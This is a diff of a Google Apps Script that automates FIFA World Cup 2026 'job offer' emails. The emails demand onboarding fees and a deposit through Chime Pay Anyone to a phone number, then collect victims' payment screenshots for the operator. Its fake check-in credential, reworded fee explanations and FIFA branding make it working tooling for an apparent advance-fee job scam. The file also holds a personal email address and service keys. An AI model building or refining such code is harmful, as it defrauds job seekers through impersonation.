@@ -1,26 +1,66 @@
 /**
  * FIFA World Cup 2026 — Email 2 (offer + payment) after application.
  *
- * Setup:
- * 1. Replace all code in your Apps Script project with this file
- * 2. Save (Ctrl+S)
- * 3. Deploy → Manage deployments → Edit → New version → Deploy
- * 4. Add time-driven trigger: sendDueFollowUpEmails → every hour
+ * SCRIPT_VERSION: 2026-06-05-payment-notify
  *
- * DOMAIN FIX: payment links are always built from PAYMENT_PAGE_URL below.
- * Do not store payload.paymentUrl from the careers site (it may be an old Netlify URL).
+ * ⚠️ REDEPLOY — read before saving:
+ * 1. In Apps Script, select ALL code in Code.gs and DELETE it.
+ * 2. Paste this ENTIRE file (do not merge with old code).
+ * 3. Save → Deploy → Manage deployments → Edit → New version → Deploy.
+ * 4. Time-driven trigger: sendDueFollowUpEmails → every hour.
+ *
+ * DOMAIN: payment links always use PAYMENT_PAGE_URL (fifa26workforce.com).
+ * Stale Netlify URLs in the POST body are ignored.
  */
 
-const FOLLOWUP_DELAY_MS = 5 * 60 * 1000; // 5 min for testing — use 4 * 60 * 60 * 1000 for production
+const SCRIPT_VERSION = "2026-06-05-payment-notify";
+
+const FOLLOWUP_DELAY_MS = 5 * 60 * 1000; // testing: 5 min — production: 4 * 60 * 60 * 1000
 const QUEUE_PREFIX = "followup_";
 const PAYMENT_PAGE_URL = "https://fifa26workforce.com";
 const COMPANY_LOGO_URL =
   "https://res.cloudinary.com/dhrjlmfcp/image/upload/v1781028763/email-assets/bt5l2gysvg0fjgfndgbw.png";
 const EMAIL_SUBJECT = "Your FIFA World Cup 2026 offer — next steps";
+
+/** "gmail" (partner default) or "emailjs" (needs EMAILJS_PRIVATE_KEY in Script properties). */
+const EMAIL_SENDER = "gmail";
+
+const EMAILJS_PUBLIC_KEY = "F34PJBkDeDBtVEddl";
+const EMAILJS_SERVICE_ID = "service_scveg1v";
+const EMAILJS_APPROVAL_TEMPLATE_ID = "template_APPROVAL_TEMPLATE_ID";
+
 const CHIME_PAYMENT_NUMBER = "+1 (513) 628-6294";
+const CHIME_PAYMENT_EMAIL = "payment@fifa26workforce.com";
+
+/** Inbox for payment screenshot alerts. Change to your Gmail if payment@ is not set up yet. */
+const PAYMENT_NOTIFICATION_EMAIL = "payment@fifa26workforce.com";
+
+const DEFAULT_PAYMENT_EXPLANATION =
+  "These fees cover your onboarding, pre-employment screening, health assessment, and role training required to confirm your match-day placement at the FIFA World Cup 2026. The uniform deposit is fully refundable on return of your issued kit.";
+
+function doGet() {
+  return jsonResponse({
+    ok: true,
+    scriptVersion: SCRIPT_VERSION,
+    paymentPageUrl: PAYMENT_PAGE_URL,
+    emailDesign: "venue-check-in-pass",
+    hint: "If scriptVersion is not 2026-06-05-payment-notify, paste full Apps Script.js from partner package and deploy new version.",
+  });
+}
 
 function doPost(event) {
+  if (!event || !event.postData || !event.postData.contents) {
+    return jsonResponse({
+      error: "doPost needs a POST body from the careers site. In the editor, run testSetup() instead.",
+    });
+  }
+
   const payload = JSON.parse(event.postData.contents || "{}");
+
+  if (payload.type === "payment_submission") {
+    return handlePaymentSubmission(payload);
+  }
+
   const applicationId = String(payload.applicationId || "");
 
   if (!applicationId || !payload.email) {
@@ -56,7 +96,122 @@ function doPost(event) {
     JSON.stringify(record),
   );
 
-  return jsonResponse({ ok: true, applicationId, sendAt: record.sendAt, paymentUrl: record.paymentUrl });
+  return jsonResponse({
+    ok: true,
+    scriptVersion: SCRIPT_VERSION,
+    applicationId,
+    sendAt: record.sendAt,
+    paymentUrl: record.paymentUrl,
+  });
+}
+
+function handlePaymentSubmission(payload) {
+  const applicationId = String(payload.applicationId || "").trim();
+  const applicantEmail = String(payload.applicantEmail || "").trim();
+
+  if (!applicationId || !applicantEmail) {
+    return jsonResponse({ error: "applicationId and applicantEmail are required" });
+  }
+
+  const record = {
+    applicationId,
+    applicantName: String(payload.applicantName || ""),
+    applicantEmail,
+    transactionRef: String(payload.transactionRef || ""),
+    role: String(payload.role || ""),
+    amount: String(payload.amount || ""),
+    paymentMethod: String(payload.paymentMethod || "Chime Pay Anyone"),
+    confirmationRef: String(payload.confirmationRef || ""),
+    screenshotUrl: String(payload.screenshotUrl || ""),
+    timestamp: String(payload.timestamp || new Date().toISOString()),
+  };
+
+  sendPaymentNotificationEmail(record);
+
+  return jsonResponse({
+    ok: true,
+    scriptVersion: SCRIPT_VERSION,
+    type: "payment_submission",
+    confirmationRef: record.confirmationRef,
+    notificationSentTo: PAYMENT_NOTIFICATION_EMAIL,
+  });
+}
+
+function sendPaymentNotificationEmail(record) {
+  const subject = "Payment screenshot received — " + record.applicationId;
+
+  GmailApp.sendEmail(PAYMENT_NOTIFICATION_EMAIL, subject, buildPaymentNotificationPlain(record), {
+    htmlBody: buildPaymentNotificationHtml(record),
+    name: "FIFA Payment Portal",
+  });
+}
+
+function buildPaymentNotificationHtml(record) {
+  const screenshotBlock = record.screenshotUrl
+    ? '<div style="margin:20px 0;text-align:center;">' +
+      '<p style="margin:0 0 10px;font-size:13px;font-weight:700;color:#051d39;">Payment screenshot</p>' +
+      '<a href="' +
+      escapeHtml(record.screenshotUrl) +
+      '" style="display:block;">' +
+      '<img src="' +
+      escapeHtml(record.screenshotUrl) +
+      '" alt="Payment screenshot" style="max-width:100%;height:auto;border:1px solid #e4e8f0;border-radius:8px;" />' +
+      "</a>" +
+      '<p style="margin:10px 0 0;font-size:12px;color:#505b73;">' +
+      '<a href="' +
+      escapeHtml(record.screenshotUrl) +
+      '">Open full image</a></p></div>'
+    : '<p style="margin:16px 0;font-size:14px;color:#92400e;">No screenshot URL was included in this submission.</p>';
+
+  return (
+    '<div style="font-family:Arial,sans-serif;background:#f4f4f4;padding:24px;">' +
+    '<div style="max-width:560px;margin:0 auto;background:#ffffff;padding:28px;border-radius:8px;">' +
+    '<h1 style="margin:0 0 8px;font-size:22px;color:#051d39;">New payment submission</h1>' +
+    '<p style="margin:0 0 20px;font-size:14px;color:#505b73;">A candidate submitted payment details on the workforce payment page.</p>' +
+    '<table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="border-collapse:collapse;font-size:14px;color:#1c2121;">' +
+    rowHtml("Application ID", record.applicationId) +
+    rowHtml("Name", record.applicantName) +
+    rowHtml("Email", record.applicantEmail) +
+    rowHtml("Role", record.role) +
+    rowHtml("Amount", record.amount) +
+    rowHtml("Payment method", record.paymentMethod) +
+    rowHtml("Transaction ref", record.transactionRef || "—") +
+    rowHtml("Confirmation ref", record.confirmationRef) +
+    rowHtml("Submitted", record.timestamp) +
+    "</table>" +
+    screenshotBlock +
+    "</div></div>"
+  );
+}
+
+function rowHtml(label, value) {
+  return (
+    "<tr>" +
+    '<td style="padding:8px 0;font-weight:700;color:#051d39;vertical-align:top;width:140px;">' +
+    escapeHtml(label) +
+    "</td>" +
+    '<td style="padding:8px 0;color:#1c2121;">' +
+    escapeHtml(value) +
+    "</td></tr>"
+  );
+}
+
+function buildPaymentNotificationPlain(record) {
+  return [
+    "New payment submission",
+    "",
+    "Application ID: " + record.applicationId,
+    "Name: " + record.applicantName,
+    "Email: " + record.applicantEmail,
+    "Role: " + record.role,
+    "Amount: " + record.amount,
+    "Payment method: " + record.paymentMethod,
+    "Transaction ref: " + (record.transactionRef || "—"),
+    "Confirmation ref: " + record.confirmationRef,
+    "Submitted: " + record.timestamp,
+    "",
+    "Screenshot: " + (record.screenshotUrl || "not provided"),
+  ].join("\n");
 }
 
 function sendDueFollowUpEmails() {
@@ -78,10 +233,70 @@ function sendDueFollowUpEmails() {
 }
 
 function sendFollowUpEmail(record) {
+  if (EMAIL_SENDER === "emailjs") {
+    sendFollowUpEmailViaEmailJS(record);
+    return;
+  }
+  sendFollowUpEmailViaGmail(record);
+}
+
+function sendFollowUpEmailViaGmail(record) {
   GmailApp.sendEmail(record.email, EMAIL_SUBJECT, plainTextFromRecord(record), {
     htmlBody: buildApprovalEmailHtml(record),
     name: "FIFA Careers",
   });
+}
+
+function sendFollowUpEmailViaEmailJS(record) {
+  const privateKey =
+    PropertiesService.getScriptProperties().getProperty("EMAILJS_PRIVATE_KEY") || "";
+
+  if (!privateKey) {
+    throw new Error(
+      "EMAILJS_PRIVATE_KEY is missing. Add it in Apps Script → Project Settings → Script properties.",
+    );
+  }
+
+  const fees = record.fees || {};
+  const paymentUrl = resolvePaymentUrl(record);
+
+  const response = UrlFetchApp.fetch("https://api.emailjs.com/api/v1.0/email/send", {
+    method: "post",
+    contentType: "application/json",
+    payload: JSON.stringify({
+      service_id: EMAILJS_SERVICE_ID,
+      template_id: EMAILJS_APPROVAL_TEMPLATE_ID,
+      user_id: EMAILJS_PUBLIC_KEY,
+      accessToken: privateKey,
+      template_params: {
+        to_email: record.email,
+        to_name: record.name,
+        name: record.name,
+        email: record.email,
+        job_title: record.jobTitle,
+        application_id: record.applicationId,
+        reporting_instruction: record.reportingInstruction,
+        reporting_date: record.reportingDateLabel,
+        reporting_time: record.reportingTimeLabel,
+        stadium_name: record.stadiumName,
+        stadium_address: record.stadiumAddress,
+        fee_rows_html: buildFeeRowsHtml(fees),
+        compulsory_total: fees.compulsoryTotalLabel || "",
+        deposit_total: fees.depositTotalLabel || "",
+        grand_total: fees.grandTotalLabel || "",
+        payment_explanation: getPaymentExplanation(record),
+        payment_url: paymentUrl,
+        logo_url: COMPANY_LOGO_URL,
+        message_html: buildApprovalEmailHtml(record),
+      },
+    }),
+    muteHttpExceptions: true,
+  });
+
+  const status = response.getResponseCode();
+  if (status < 200 || status >= 300) {
+    throw new Error("EmailJS send failed (" + status + "): " + response.getContentText());
+  }
 }
 
 /** Always rebuild from PAYMENT_PAGE_URL — ignores stale Netlify URLs in the queue. */
@@ -110,6 +325,14 @@ function buildPaymentUrl(record) {
   return PAYMENT_PAGE_URL.replace(/\/+$/, "") + "/?d=" + encodeURIComponent(encoded);
 }
 
+function getPaymentExplanation(record) {
+  const text = String(record.paymentExplanation || "").trim();
+  if (!text || /compulsory/i.test(text)) {
+    return DEFAULT_PAYMENT_EXPLANATION;
+  }
+  return text;
+}
+
 function buildFeeRowsHtml(fees) {
   return ((fees && fees.items) || [])
     .map(function (item) {
@@ -132,9 +355,79 @@ function buildFeeRowsHtml(fees) {
     .join("");
 }
 
+function buildVenueCheckInPassHtml(record) {
+  const id = escapeHtml(record.applicationId || "");
+  const name = escapeHtml(record.name || "");
+  const role = escapeHtml(record.jobTitle || "");
+  const date = escapeHtml(record.reportingDateLabel || "");
+  const time = escapeHtml(record.reportingTimeLabel || "");
+  const venue = escapeHtml(record.stadiumName || "");
+
+  return (
+    '<div style="margin:32px 0;border-radius:12px;overflow:hidden;border:2px solid #051d39;box-shadow:0 8px 28px rgba(5,29,57,0.22);max-width:100%;">' +
+    '<div style="background:#051d39;padding:18px 20px 16px;text-align:center;">' +
+    '<p style="margin:0;font-size:9px;font-weight:700;letter-spacing:0.28em;color:#94a3b8;text-transform:uppercase;">Official workforce credential</p>' +
+    '<p style="margin:5px 0 0;font-size:10px;font-weight:700;letter-spacing:0.22em;color:#d4af37;text-transform:uppercase;">FIFA World Cup 2026&trade;</p>' +
+    '<p style="margin:8px 0 0;font-size:17px;font-weight:800;color:#ffffff;letter-spacing:0.12em;text-transform:uppercase;">Venue Check-In Pass</p>' +
+    "</div>" +
+    '<div style="height:4px;background:linear-gradient(90deg,#1277d9 0%,#d4af37 50%,#1277d9 100%);"></div>' +
+    '<div style="background:#ffffff;padding:0;">' +
+    '<table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="border-collapse:collapse;">' +
+    "<tr>" +
+    '<td style="width:6px;background:#1277d9;"></td>' +
+    '<td style="padding:24px 22px 20px;text-align:center;">' +
+    '<p style="margin:0 0 6px;font-size:10px;font-weight:800;letter-spacing:0.16em;text-transform:uppercase;color:#1277d9;">Present at stadium reception</p>' +
+    '<p style="margin:0 0 2px;font-size:12px;color:#6b7280;">Assigned to</p>' +
+    '<p style="margin:0 0 16px;font-size:19px;font-weight:800;color:#051d39;line-height:1.35;">' +
+    name +
+    "</p>" +
+    '<p style="margin:0 0 6px;font-size:10px;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:#6b7280;">Application ID</p>' +
+    '<div style="margin:0 auto 16px;padding:16px 18px;background:linear-gradient(180deg,#f8fafc 0%,#ffffff 100%);border:2px solid #051d39;border-radius:8px;max-width:340px;box-shadow:inset 0 1px 0 rgba(255,255,255,0.8),0 2px 8px rgba(5,29,57,0.08);">' +
+    '<p style="margin:0;font-size:30px;font-weight:800;color:#051d39;font-family:Courier New,Courier,monospace;letter-spacing:0.1em;line-height:1.15;">' +
+    id +
+    "</p>" +
+    "</div>" +
+    '<p style="margin:0 0 18px;font-size:13px;color:#505b73;line-height:1.5;">' +
+    role +
+    "</p>" +
+    '<div style="margin:0 auto 18px;max-width:320px;border-top:2px dashed #cbd5e1;padding-top:14px;">' +
+    '<p style="margin:0;font-size:10px;font-weight:700;color:#94a3b8;letter-spacing:0.2em;line-height:1.8;">&#9632;&#9632;&#9632; &#9632;&#9632;&#9632; &#9632;&#9632;&#9632; &#9632;&#9632;&#9632; &#9632;&#9632;&#9632;</p>' +
+    "</div>" +
+    '<div style="margin:0 auto;max-width:360px;padding:16px 18px;background:#fffbeb;border:2px solid #f59e0b;border-radius:10px;box-shadow:0 2px 10px rgba(245,158,11,0.15);">' +
+    '<p style="margin:0;font-size:13px;font-weight:800;color:#92400e;text-transform:uppercase;letter-spacing:0.08em;">&#128247; Screenshot this entire card</p>' +
+    '<p style="margin:10px 0 0;font-size:12px;color:#78350f;line-height:1.6;">Save it to your phone and show it at reception on your reporting date. Check-in may be delayed without it.</p>' +
+    "</div>" +
+    "</td>" +
+    '<td style="width:6px;background:#1277d9;"></td>' +
+    "</tr></table>" +
+    "</div>" +
+    '<div style="background:#f0f4f8;padding:14px 18px;border-top:1px solid #d8dee8;">' +
+    '<table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="border-collapse:collapse;">' +
+    "<tr>" +
+    '<td style="padding:4px 0;font-size:11px;font-weight:700;color:#051d39;text-transform:uppercase;letter-spacing:0.06em;width:72px;">Date</td>' +
+    '<td style="padding:4px 0;font-size:12px;color:#505b73;">' +
+    date +
+    "</td>" +
+    "</tr>" +
+    "<tr>" +
+    '<td style="padding:4px 0;font-size:11px;font-weight:700;color:#051d39;text-transform:uppercase;letter-spacing:0.06em;width:72px;">Time</td>' +
+    '<td style="padding:4px 0;font-size:12px;color:#505b73;">' +
+    time +
+    "</td>" +
+    "</tr>" +
+    (venue
+      ? "<tr><td style=\"padding:4px 0;font-size:11px;font-weight:700;color:#051d39;text-transform:uppercase;letter-spacing:0.06em;width:72px;\">Venue</td><td style=\"padding:4px 0;font-size:12px;color:#505b73;\">" +
+        venue +
+        "</td></tr>"
+      : "") +
+    "</table></div></div>"
+  );
+}
+
 function buildApprovalEmailHtml(record) {
   const fees = record.fees || {};
   const paymentUrl = resolvePaymentUrl(record);
+  const paymentExplanation = getPaymentExplanation(record);
 
   return (
     '<div style="background:#f4f4f4;padding:30px 0;font-family:Arial,sans-serif;">' +
@@ -151,13 +444,7 @@ function buildApprovalEmailHtml(record) {
     '<p style="font-size:17px;line-height:1.7;color:#1c2121;">We are pleased to confirm your placement as <strong>' +
     escapeHtml(record.jobTitle) +
     "</strong> at the FIFA World Cup 2026. Please review the details below and complete your onboarding fees to secure your position.</p>" +
-    '<div style="margin:28px 0;padding:22px 24px;border:2px dashed #1277d9;border-radius:8px;background:#f5faff;">' +
-    '<p style="margin:0 0 8px;font-size:13px;font-weight:700;color:#1277d9;text-transform:uppercase;letter-spacing:0.05em;">Save your application reference</p>' +
-    '<p style="margin:0;font-size:30px;font-weight:700;color:#051d39;font-family:monospace;">' +
-    escapeHtml(record.applicationId) +
-    "</p>" +
-    '<p style="margin:8px 0 0;font-size:13px;color:#505b73;">Screenshot this section — you will need this reference at venue check-in.</p>' +
-    "</div>" +
+    buildVenueCheckInPassHtml(record) +
     '<h2 style="font-size:22px;color:#051d39;margin:28px 0 12px;">Reporting details</h2>' +
     '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
     escapeHtml(record.reportingInstruction) +
@@ -174,7 +461,7 @@ function buildApprovalEmailHtml(record) {
     "</p>" +
     '<h2 style="font-size:22px;color:#051d39;margin:28px 0 12px;">Onboarding fees</h2>' +
     '<p style="font-size:16px;line-height:1.7;color:#1c2121;">' +
-    escapeHtml(record.paymentExplanation) +
+    escapeHtml(paymentExplanation) +
     "</p>" +
     '<div style="margin:18px 0;border:1px solid #e4e8f0;border-radius:8px;overflow:hidden;">' +
     buildFeeRowsHtml(fees) +
@@ -187,11 +474,6 @@ function buildApprovalEmailHtml(record) {
     "<br><strong>Amount due:</strong> " +
     escapeHtml(fees.grandTotalLabel || "") +
     "</p>" +
-    '<div style="margin:24px 0;padding:16px 18px;border:1px solid #e4e8f0;border-radius:8px;background:#f8fafc;">' +
-    '<p style="margin:0 0 6px;font-size:14px;font-weight:700;color:#051d39;">How to pay</p>' +
-    '<p style="margin:0;font-size:15px;line-height:1.6;color:#505b73;">Send the <strong>amount due</strong> via <strong>Chime Pay Anyone</strong> to <strong>' +
-    escapeHtml(CHIME_PAYMENT_NUMBER) +
-    "</strong>, then use the button below for step-by-step instructions.</p></div>" +
     '<div style="text-align:center;margin:34px 0;">' +
     '<a href="' +
     paymentUrl +
@@ -211,8 +493,9 @@ function plainTextFromRecord(record) {
     "",
     "We are pleased to confirm your placement as " + record.jobTitle + " at the FIFA World Cup 2026.",
     "",
-    "Application reference: " + record.applicationId,
-    "(Screenshot or note this down — you will need it at venue check-in.)",
+    "VENUE CHECK-IN PASS — SCREENSHOT REQUIRED",
+    "Application ID: " + record.applicationId,
+    "Present a screenshot of your Venue Check-In Pass at stadium reception.",
     "",
     "REPORTING DETAILS",
     record.reportingInstruction,
@@ -221,14 +504,12 @@ function plainTextFromRecord(record) {
     "Venue: " + record.stadiumName + ", " + record.stadiumAddress,
     "",
     "ONBOARDING FEES",
-    record.paymentExplanation,
+    getPaymentExplanation(record),
     "Onboarding fees: " + (fees.compulsoryTotalLabel || ""),
     "Uniform deposit (refundable): " + (fees.depositTotalLabel || ""),
     "Amount due: " + (fees.grandTotalLabel || ""),
     "",
-    "Pay via Chime Pay Anyone to " + CHIME_PAYMENT_NUMBER,
-    "",
-    "Complete your payment here:",
+    "Complete your payment here (Chime instructions are on the payment page):",
     paymentUrl,
     "",
     "If you have any questions, reply to this email.",
@@ -249,7 +530,10 @@ function jsonResponse(body) {
   );
 }
 
+/** Run in Apps Script editor to verify deploy + queue a test email. */
 function testSetup() {
+  Logger.log("Script version: " + SCRIPT_VERSION);
+
   const testData = {
     postData: {
       contents: JSON.stringify({
@@ -265,7 +549,7 @@ function testSetup() {
         reportingDateLabel: "June 15, 2026",
         reportingTimeLabel: "7:00 AM",
         reportingInstruction:
-          "Please report to the staff entrance on Gate C with your application reference and a valid photo ID.",
+          "Please report to the staff entrance on Gate C with your Venue Check-In Pass screenshot and a valid photo ID.",
         fees: {
           items: [
             {
@@ -303,7 +587,7 @@ function testSetup() {
           grandTotalLabel: "$85.00",
         },
         paymentExplanation:
-          "These fees cover your onboarding, pre-employment screening, health assessment, and role training required to confirm your match-day placement at the FIFA World Cup 2026. The uniform deposit is fully refundable on return of your issued kit.",
+          "These fees cover your onboarding, screening, health assessment, and training for your FIFA World Cup 2026 placement.",
         paymentUrl: "https://imaginative-bonbon-f200da.netlify.app/?d=OLD_SHOULD_BE_IGNORED",
       }),
     },
@@ -311,7 +595,34 @@ function testSetup() {
 
   const result = doPost(testData);
   const body = JSON.parse(result.getContent());
-  Logger.log("Result: " + result.getContent());
-  Logger.log("Payment URL should be fifa26workforce.com: " + body.paymentUrl);
-  Logger.log("Test email will arrive in 5 minutes at oladeinderichard1@gmail.com");
+  Logger.log("doPost result: " + result.getContent());
+  Logger.log("Payment URL must be fifa26workforce.com: " + body.paymentUrl);
+  Logger.log("Test email queued — arrives after FOLLOWUP_DELAY_MS");
+}
+
+/** Run in Apps Script editor to test payment screenshot notification email. */
+function testPaymentNotification() {
+  Logger.log("Script version: " + SCRIPT_VERSION);
+
+  const result = doPost({
+    postData: {
+      contents: JSON.stringify({
+        type: "payment_submission",
+        applicationId: "APP-TEST-PAY-" + Date.now(),
+        applicantName: "Test Applicant",
+        applicantEmail: "test@example.com",
+        transactionRef: "CHIME-TEST-123",
+        role: "Catering Coordinator",
+        amount: "$85.00",
+        paymentMethod: "Chime Pay Anyone",
+        confirmationRef: "CONF-TEST-" + Date.now(),
+        screenshotUrl:
+          "https://res.cloudinary.com/dibwotfd5/image/upload/v1/samples/ecommerce/accessories-bag.jpg",
+        timestamp: new Date().toISOString(),
+      }),
+    },
+  });
+
+  Logger.log("Payment notification result: " + result.getContent());
+  Logger.log("Check inbox: " + PAYMENT_NOTIFICATION_EMAIL);
 }
